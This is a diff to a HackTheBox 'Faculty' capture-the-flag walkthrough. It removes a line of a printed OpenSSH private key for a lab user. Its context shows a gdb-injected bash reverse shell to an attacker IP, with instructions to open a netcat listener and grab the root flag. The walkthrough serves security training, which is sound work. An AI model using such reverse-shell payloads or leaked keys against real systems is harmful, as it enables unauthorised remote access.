@@ -388,7 +388,6 @@ jrzHFkgTUug0lsPE4ZLB0Re6Iq3ngtaNUAAADBANBXLol4lHhpWL30or8064fjhXGjhY4g
 blDouPQFIwCaRbSWLnKvKCwaPaZzocdHlr5wRXwRq8V1VPmsxX8O87y9Ro5guymsdPprXF
 LETXujOl8CFiHvMA1Zf6eriE1/Od3JcUKiHTwv19MwqHitxUcNW0sETwZ+FAHBBuc2NTVF
 YEeVKoox5zK4lPYIAgGJvhUTzSuu0tS8O9bGnTBTqUAq21NF59XVHDlX0ZAkCfnTW4IE7j
-9u1fIdwzi56TWNhQAAABFkZXZlbG9wZXJAZmFjdWx0eQ==
 -----END OPENSSH PRIVATE KEY-----
 ```
 
@@ -520,6 +519,7 @@ call (void)system("bash -c 'bash -i >& /dev/tcp/10.10.14.168/5454 0>&1'")
 ```
 
 Obviously, create your netcat listener on your machine, then get the flag. If having isses with the system symbol, a safe choice is the python3 process.
+
 
 <p align="center">
   <img src="/images/walkthroughs/hackthebox/faculty/11_root.png" width="90%"/>
